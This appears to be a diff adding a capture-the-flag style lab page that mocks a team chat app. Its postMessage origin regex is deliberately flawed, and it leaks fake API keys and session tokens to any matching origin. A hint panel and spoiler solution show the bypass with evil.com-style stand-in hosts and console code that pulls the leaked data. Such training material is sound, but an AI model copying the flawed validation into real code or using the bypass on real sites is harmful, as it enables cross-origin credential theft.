@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TeamSync - Workspace</title>
+  <link rel="stylesheet" href="/css/hint-panel.css">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:#f5f5f4;color:#1c1917}
+    .ts-nav{background:#292524;color:#e7e5e4;height:48px;display:flex;align-items:center;padding:0 20px;gap:20px;font-size:13px}.ts-nav .brand{font-weight:800;font-size:15px;color:#f97316}.ts-nav a{color:#a8a29e;text-decoration:none}.ts-nav a:hover{color:#e7e5e4}
+    .ts-body{max-width:800px;margin:0 auto;padding:32px 24px}
+    h1{font-size:22px;font-weight:700;margin-bottom:4px}
+    .desc{font-size:13px;color:#78716c;margin-bottom:24px}
+    .card{background:#fff;border:1px solid #e7e5e4;border-radius:10px;padding:20px;margin-bottom:14px}
+    .card h2{font-size:15px;font-weight:700;margin-bottom:10px}
+    .msg-list{list-style:none}.msg-list li{padding:10px 0;border-bottom:1px solid #f5f5f4;font-size:13px;display:flex;gap:10px;align-items:flex-start}.msg-list li:last-child{border-bottom:none}
+    .msg-avatar{width:32px;height:32px;border-radius:50%;background:#fed7aa;color:#9a3412;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0}
+    .msg-body{flex:1}.msg-author{font-weight:600;font-size:12px}.msg-text{color:#57534e;margin-top:2px}.msg-time{font-size:11px;color:#a8a29e;margin-top:2px}
+    .integration-frame{background:#fafaf9;border:1px dashed #d6d3d1;border-radius:8px;padding:20px;text-align:center;font-size:13px;color:#a8a29e;min-height:120px}
+    #security-log{font-family:'Fira Code',monospace;font-size:11px;background:#1c1917;color:#a8a29e;padding:12px;border-radius:8px;margin-top:12px;max-height:200px;overflow-y:auto;white-space:pre-wrap}
+    .user-data-display{background:#fef3c7;border:1px solid #fde68a;border-radius:8px;padding:14px;font-size:13px;margin-top:10px;display:none;word-break:break-all}
+    .user-data-display.show{display:block}
+    .btn{padding:7px 14px;border-radius:7px;font-size:12px;font-weight:600;cursor:pointer;border:1px solid #d6d3d1;background:#fff;color:#44403c}.btn:hover{background:#fafaf9}
+    .btn-orange{background:#f97316;color:#fff;border-color:#f97316}.btn-orange:hover{background:#ea580c}
+  </style>
+</head>
+<body>
+  <div class="ts-nav">
+    <div class="brand">TeamSync</div>
+    <a href="#">Channels</a>
+    <a href="#">People</a>
+    <a href="#">Files</a>
+    <a href="#">Integrations</a>
+  </div>
+
+  <div class="ts-body">
+    <h1>General Channel</h1>
+    <p class="desc">TeamSync Workspace &middot; 12 members online</p>
+
+    <div class="card">
+      <h2>Messages</h2>
+      <ul class="msg-list">
+        <li><div class="msg-avatar">SC</div><div class="msg-body"><div class="msg-author">Sarah Chen</div><div class="msg-text">Just deployed the new dashboard. Let me know if you see any issues.</div><div class="msg-time">10:32 AM</div></div></li>
+        <li><div class="msg-avatar">MT</div><div class="msg-body"><div class="msg-author">Mike Torres</div><div class="msg-text">Looks great! The charts are loading much faster now.</div><div class="msg-time">10:45 AM</div></div></li>
+        <li><div class="msg-avatar">AK</div><div class="msg-body"><div class="msg-author">Alex Kim</div><div class="msg-text">Found a small CSS bug on mobile, creating a ticket.</div><div class="msg-time">11:02 AM</div></div></li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <h2>Integration Widget</h2>
+      <p style="font-size:12px;color:#78716c;margin-bottom:10px">Third-party integrations communicate via postMessage. Origin is validated before processing.</p>
+      <div class="integration-frame" id="integration-area">
+        Integration iframe area &mdash; external widgets load here
+      </div>
+      <div class="user-data-display" id="user-data-output"></div>
+      <div id="security-log">// Security log - origin validation</div>
+    </div>
+  </div>
+
+  <script>
+    /**
+     * TeamSync Integration Bridge v1.8.3
+     * Handles cross-origin widget communication
+     * Origin validated via regex allowlist
+     */
+    !function(){"use strict";var _sl=function(m){var el=document.getElementById("security-log");if(el)el.textContent+="["+new Date().toLocaleTimeString()+"] "+m+"\n"};var TRUSTED_PATTERN=/^https?:\/\/([a-z0-9-]+\.)*teamsync.io/;var ALLOWED_ACTIONS=["getUserData","updateStatus","getChannelInfo","setTheme"];var IntegrationBridge={validateOrigin:function(origin){var result=TRUSTED_PATTERN.test(origin);_sl("Origin check: "+origin+" → "+(result?"ALLOWED":"BLOCKED"));return result},handleMessage:function(event){if(!this.validateOrigin(event.origin)){_sl("REJECTED: "+event.origin+" failed origin check");return}_sl("ACCEPTED: "+event.origin+" passed origin check");var data=event.data;if(typeof data==="string"){try{data=JSON.parse(data)}catch(e){return}}if(!data||!data.action)return;if(ALLOWED_ACTIONS.indexOf(data.action)===-1){_sl("Unknown action: "+data.action);return}switch(data.action){case"getUserData":_sl("Action: getUserData — sending profile to "+event.origin);event.source.postMessage({type:"ts:userData",username:"victim",email:"victim@example.com",role:"admin",apiKey:"sk_live_teamsync_"+Math.random().toString(36).substr(2,16),sessionToken:"sess_"+Math.random().toString(36).substr(2,24)},"*");var ud=document.getElementById("user-data-output");if(ud){ud.className="user-data-display show";ud.textContent="Sent user data to: "+event.origin}break;case"updateStatus":_sl("Action: updateStatus → "+data.status);break;case"getChannelInfo":_sl("Action: getChannelInfo");event.source.postMessage({type:"ts:channelInfo",name:"General",members:12},"*");break;case"setTheme":_sl("Action: setTheme → "+(data.theme||"default"));if(data.theme==="dark")document.body.style.background="#1c1917";break}},init:function(){var self=this;window.addEventListener("message",function(e){self.handleMessage(e)});_sl("Integration bridge v1.8.3 ready");_sl("Trusted pattern: "+TRUSTED_PATTERN.toString())}};IntegrationBridge.init();window.IntegrationBridge=IntegrationBridge}();
+  </script>
+
+  <button class="stuck-btn" onclick="toggleHints()"><span class="q">💡</span> Stuck?</button>
+  <div class="hint-backdrop" id="hintBackdrop" onclick="toggleHints()"></div>
+  <div class="hint-panel" id="hintPanel">
+    <div class="hint-header">
+      <h2>Hint: Regex Origin Bypass</h2>
+      <button class="hint-close" onclick="toggleHints()">×</button>
+    </div>
+    <div class="hint-body">
+      <div class="hint-intro">The postMessage handler validates origin with a regex. But the regex has TWO classic mistakes that let you bypass it from your own domain. Based on <a href="https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised" style="color:#3b82f6">Microsoft MSRC research</a>.</div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">1</div><span>Find the regex pattern</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Beautify the minified code. The pattern is:
+          <pre><code>var TRUSTED_PATTERN = /^https?:\/\/([a-z0-9-]+\.)*teamsync.io/;</code></pre>
+          Two bugs are hiding in this regex.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">2</div><span>Bug 1: unescaped dot</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          The dot in <code>teamsync.io</code> is unescaped. In regex, <code>.</code> matches ANY character. So <code>teamsyncXio</code> passes. An attacker registers <code>teamsyncXio.evil.com</code>.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">3</div><span>Bug 2: missing $ anchor</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          No <code>$</code> at the end. The regex checks the START of the origin but not the END. <code>https://teamsync.io.evil.com</code> passes because the regex matches the prefix.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">4</div><span>Exploit locally</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          For local testing, you can simulate by running in the console — the handler passes messages from any origin matching the regex. Or manually call the handler with a faked event. The key is proving the regex allows unintended origins and the <code>getUserData</code> action leaks sensitive data + API keys.
+        </div>
+      </div>
+
+      <div class="hint-spoiler">
+        <button class="hint-spoiler-btn" onclick="this.parentElement.classList.toggle('open')">🚩 Full Solution</button>
+        <div class="hint-spoiler-content">
+          <p><strong>Prove the regex is broken (in console):</strong></p>
+          <pre>var regex = /^https?:\/\/([a-z0-9-]+\.)*teamsync.io/;
+
+// These should NOT match but DO:
+console.log(regex.test("https://teamsyncXio.evil.com"));  // true!
+console.log(regex.test("https://teamsync.io.evil.com"));   // true!
+console.log(regex.test("https://sub.teamsync.io.attacker.com")); // true!</pre>
+          <p><strong>Trigger data exfil (simulating attacker origin):</strong></p>
+          <pre>// Listen for the leaked data
+window.addEventListener('message', e => {
+  if (e.data && e.data.type === 'ts:userData') {
+    alert('STOLEN: ' + JSON.stringify(e.data));
+  }
+});
+// The handler sends data to event.source with targetOrigin: *
+// So even from this console, request the data:
+IntegrationBridge.handleMessage({
+  origin: 'https://teamsync.io.evil.com',
+  data: {action: 'getUserData'},
+  source: window
+});</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/app.js"></script>
+  <script>
+    setupLabVerification('pm-adv-regex', 'xss');
+    function toggleHints() {
+      document.getElementById('hintPanel').classList.toggle('open');
+      document.getElementById('hintBackdrop').classList.toggle('show');
+    }
+  </script>
+</body>
+</html>
